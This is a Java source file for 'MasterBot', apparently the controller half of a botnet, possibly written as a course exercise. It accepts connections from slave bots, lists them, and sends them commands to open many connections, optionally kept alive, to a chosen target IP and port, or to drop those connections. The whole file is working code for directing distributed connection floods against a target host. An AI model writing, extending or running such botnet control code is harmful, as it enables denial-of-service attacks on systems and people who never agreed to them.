import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;

public class MasterBot{


	public static void main(String args[]) throws IOException{

		if (!args[0].equals("-p")) 
		{
			System.out.println("Input Format: MasterBot -p portnumber");
			System.exit(-1);
		}
		else
			if(args.length != 2)
			{
				System.out.println("Input Format: MasterBot -p portnumber");
				System.exit(-1);
			}

		{ 
			ServerSocket serverSocket = new ServerSocket(Integer.parseInt(args[1]));
			//System.out.println("Listening");
			System.out.print(">");

			CommandThread commandThread = new CommandThread();
			commandThread.start();

			while(true){ 
				// Slave connect to master
				Socket socket = serverSocket.accept();
				ServerThread serverThread = new ServerThread(socket);
				serverThread.start();
			}
		}
	}


}

// Store Slave List in a LinkedList
class slaveList{
	public static List<Socket> sList = Collections.synchronizedList(new LinkedList<>());
	public static List<String> registerDate = Collections.synchronizedList(new LinkedList<>());
	public int count = 0;

	slaveList() {}
}

// Add new salve to the slave list
class ServerThread extends Thread{
	Socket socket;
	Date date = new Date();
	DateFormat d = new SimpleDateFormat("yyyy-MM-dd");
	ServerThread(Socket socket){
		this.socket = socket;
	}
	public void run(){
		synchronized(slaveList.sList){
			slaveList.sList.add(socket);
		}
		synchronized(slaveList.registerDate){
			slaveList.registerDate.add(d.format(date).toString());
		}				
	}
}

// Thread that implements command line

class CommandThread extends Thread{

	private Socket socket;
	private boolean flag = true;
	private String tIP;   // Target IP
	private int tPort;    // Target PORT
	private int connections;

	public void run(){
		while(flag){
			try{

				BufferedReader commandInput = new BufferedReader(new InputStreamReader(System.in));
				String commandLine = commandInput.readLine();
				String[] cmd;
				cmd = commandLine.split(" ");
				switch (cmd[0]) {
				case "list":
					cmdList();
					break;
				case "connect":
					connect(cmd);
					break;
				case "disconnect":
					disconnect(cmd);
					break;
				case "Exit":
					System.exit(-1);
					break;
				default:
					System.out.println("Invalid Command");
					System.out.print(">");
					break;

				}
			}
			catch (IOException e){
				e.printStackTrace();
			}
		}

	}

	// List out the Slaves
	private void cmdList(){
		Socket slave;
		int i=0;
		if(slaveList.sList.size() == 0){
			//System.out.println("Checking if slave is connected");
		}
		else{

			while(i < slaveList.sList.size()){
				slave = slaveList.sList.get(i);
				System.out.println(slave.getInetAddress().getHostName() + " " 
						+ slave.getInetAddress().getHostAddress() + " " + slave.getPort() 
						+ " " + slaveList.registerDate.get(i));
				System.out.flush();
				i++;
			}
		}
		System.out.print(">");
	}

	// Connect a number of connections to the target host.
	private void connect(String[] cmd){
		int check = 0;
		int i=0;
		if(cmd.length != 4 && cmd.length != 5 && cmd.length != 6){
			System.out.println("Usage :Invalid command!\n");
		}
		else{
			tIP = cmd[2];
			tPort = Integer.parseInt(cmd[3]);

			if(cmd.length == 4){
				connections = 1;
			}
			else if(cmd.length == 5 && cmd[4].equals("keepalive")){
				connections = 1;
			}
			else if(cmd.length == 5 && cmd[4].startsWith("url=")){
				connections = 1;
			}
			else{
				connections = Integer.parseInt(cmd[4]);
			}

			while(i < slaveList.sList.size()){

				Socket eachSocket = slaveList.sList.get(i);

				if(cmd[1].equals("all") || 
						eachSocket.getInetAddress().getHostAddress().equals(cmd[1])||
						eachSocket.getInetAddress().getHostName().equals(cmd[1])){
					check = 1;
					try{
						OutputStream os = eachSocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String outMessage = cmd[0] + " " + tIP + " " + tPort + " " + Integer.toString(connections);
						if( ( cmd.length == 6 && cmd[5].equals("keepalive") ) 
								|| (cmd.length == 5 && cmd[4].equals("keepalive")) ){
							outMessage += " keepalive";
						}
						else if( cmd.length == 5 && cmd[4].startsWith("url=")){
							outMessage += " " + cmd[4];
						}
						else if(cmd.length == 6 && cmd[5].startsWith("url=")){
							outMessage += " " + cmd[5]; 
						}
						pw.println(outMessage);
					}catch (IOException e){
						System.err.println("Failed to Excute");
						System.exit(-1);
					} 
				}  
				i++;
			}
			if(check == 0){
				System.out.println("Can not find the SlaveBot at Portal " + cmd[1]);
			}						
		}
		System.out.print(">");

	}

	// Disconnect a number of connections to a given host
	private void disconnect(String[] cmd){
		//System.out.println("disconnect");
		int i=0;
		boolean isFound = false;
		String distPort = "all";
		if(cmd.length != 3 && cmd.length != 4){
			System.out.println("Usage: Invalid command!");
		}
		else{

			tIP = cmd[2];
			if(cmd.length == 4){
				tPort = Integer.parseInt(cmd[3]);
			}

			while(i < slaveList.sList.size()){

				Socket everySocket = slaveList.sList.get(i);
				if(cmd[1].equals("all") || 
						everySocket.getInetAddress().getHostAddress().equals(cmd[1])||
						everySocket.getInetAddress().getHostName().equals(cmd[1])){

					isFound = true;
					try{
						OutputStream os = everySocket.getOutputStream();
						PrintWriter pw = new PrintWriter(os, true);
						String outMessage = "";
						if(cmd.length == 3){
							outMessage = cmd[0] + " " + tIP + " " + distPort;
						}
						else{
							outMessage = cmd[0] + " " + tIP + " " + Integer.toString(tPort); 
						}
						pw.println(outMessage);
					}
					catch (IOException e)
					{
						e.printStackTrace();
						System.exit(-1);
					}

				}
				i++;
			}
			if(isFound == false){
				System.out.println("Slave not found at " + cmd[1]);

			}

		}
		System.out.print(">");

	}

}

